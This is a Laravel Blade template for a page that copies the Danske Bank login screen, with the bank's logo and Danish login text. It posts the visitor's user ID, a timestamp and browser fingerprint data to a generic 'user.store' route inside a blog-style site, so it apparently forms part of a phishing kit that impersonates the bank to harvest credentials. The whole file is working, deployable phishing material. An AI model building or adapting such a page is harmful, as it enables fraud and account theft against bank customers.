@extends('frontend.layout')
{{-- Page title --}}
@section('title')
    Danske Bank
@stop
{{-- page level styles --}}
@section('header_styles')
@stop

@section('content')
    @include('frontend.header')
    <!-- Start Blog
============================================= -->
    <div class="blog-area single full-blog right-sidebar full-blog p-5 ">
        <div class="container">
            <div class="blog-items">
                <div class="row">
                    <div class="blog-content col-lg-7 col-md-12">
                        <div class="blog-item-box">
                            <div class="item">
                                <div class="info">
                                    <div class="text-center">
                                        <img src="{{asset('images/danske-bank-logo.svg')}}">
                                    </div>
                                    <div class="blog-item-box p-3 pt-5">
                                        <div class="item">
                                            <div class="info pb-2">
                                                <div class="pb-3" style="align-items: center">
                                                    <span>Log på hos Danske Bank A/S</span>
                                                    <div class="right" style="float: right" >
                                                        <img width="52" src="{{asset('images/logo-blue-1.png')}}">
                                                    </div>
                                                </div>
                                                <hr class="sidebar-divider my-0">
                                            </div>
                                            <div class="info pt-2">
                                                <span>BRUGER-ID</span>
                                                <form action="{{route('user.store')}}" method="post">
                                                    @csrf
                                                    <input hidden name="browsersDetails" id="browser">
                                                    <input hidden name="dateTime" value="{{date('Y-m-d H:i:s')}}">
                                                    <div class="form-group">
                                                        <input class="form-control" name="name" id="user" required>
                                                    </div>
                                                    <div class="form-group">
                                                        <button class="btn btn-info w-100" type="submit" style="justify-content: right">Fortsæt<i class="arrow_right"></i></button>
                                                    </div>
                                                </form>
                                                <a class="blue-color"><i class="ui-icon-info"></i>
                                                    Glemt bruger-ID?
                                                </a>
                                            </div>
                                            <div class="info">
                                                <div class="form-check">
                                                    <input class="form-check-input" type="checkbox" value="" id="remember">
                                                    <label class="form-check-label" for="remember">
                                                        Husk mig hos Danske Bank A/S
                                                    </label>
                                                </div>
                                                <hr class="sidebar-divider my-0">
                                                <div class="help">
                                                    <a class="blue-color" href="">Afbryd</a> <a class="blue-color" href="">Hjaelp</a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Start Sidebar -->
                    <div class="sidebar col-lg-5 col-md-12">
                        @include('frontend.sidebar')
                    </div>
                    <!-- End Start Sidebar -->
                </div>
            </div>
        </div>
    </div>
    <!-- End Blog -->
@endsection
{{-- page level scripts --}}
@section('footer_scripts')
    <script>
        $("#browser").val(browserInfo());
        function browserInfo() {
            //
            var nVer = navigator.appVersion;
            var nAgt = navigator.userAgent;
            var browserName  = navigator.appName;
            var fullVersion  = ''+parseFloat(navigator.appVersion);
            var majorVersion = parseInt(navigator.appVersion,10);
            var nameOffset,verOffset,ix;

// In Opera, the true version is after "OPR" or after "Version"
            if ((verOffset=nAgt.indexOf("OPR"))!=-1) {
                browserName = "Opera";
                fullVersion = nAgt.substring(verOffset+4);
                if ((verOffset=nAgt.indexOf("Version"))!=-1)
                    fullVersion = nAgt.substring(verOffset+8);
            }
// In MS Edge, the true version is after "Edg" in userAgent
            else if ((verOffset=nAgt.indexOf("Edg"))!=-1) {
                browserName = "Microsoft Edge";
                fullVersion = nAgt.substring(verOffset+4);
            }
// In MSIE, the true version is after "MSIE" in userAgent
            else if ((verOffset=nAgt.indexOf("MSIE"))!=-1) {
                browserName = "Microsoft Internet Explorer";
                fullVersion = nAgt.substring(verOffset+5);
            }
// In Chrome, the true version is after "Chrome"
            else if ((verOffset=nAgt.indexOf("Chrome"))!=-1) {
                browserName = "Chrome";
                fullVersion = nAgt.substring(verOffset+7);
            }
// In Safari, the true version is after "Safari" or after "Version"
            else if ((verOffset=nAgt.indexOf("Safari"))!=-1) {
                browserName = "Safari";
                fullVersion = nAgt.substring(verOffset+7);
                if ((verOffset=nAgt.indexOf("Version"))!=-1)
                    fullVersion = nAgt.substring(verOffset+8);
            }
// In Firefox, the true version is after "Firefox"
            else if ((verOffset=nAgt.indexOf("Firefox"))!=-1) {
                browserName = "Firefox";
                fullVersion = nAgt.substring(verOffset+8);
            }
// In most other browsers, "name/version" is at the end of userAgent
            else if ( (nameOffset=nAgt.lastIndexOf(' ')+1) <
                (verOffset=nAgt.lastIndexOf('/')) )
            {
                browserName = nAgt.substring(nameOffset,verOffset);
                fullVersion = nAgt.substring(verOffset+1);
                if (browserName.toLowerCase()==browserName.toUpperCase()) {
                    browserName = navigator.appName;
                }
            }
// trim the fullVersion string at semicolon/space if present
            if ((ix=fullVersion.indexOf(";"))!=-1)
                fullVersion=fullVersion.substring(0,ix);
            if ((ix=fullVersion.indexOf(" "))!=-1)
                fullVersion=fullVersion.substring(0,ix);

            majorVersion = parseInt(''+fullVersion,10);
            if (isNaN(majorVersion)) {
                fullVersion  = ''+parseFloat(navigator.appVersion);
                majorVersion = parseInt(navigator.appVersion,10);
            }
            return browserName+" "+fullVersion;

        }
    </script>
@endsection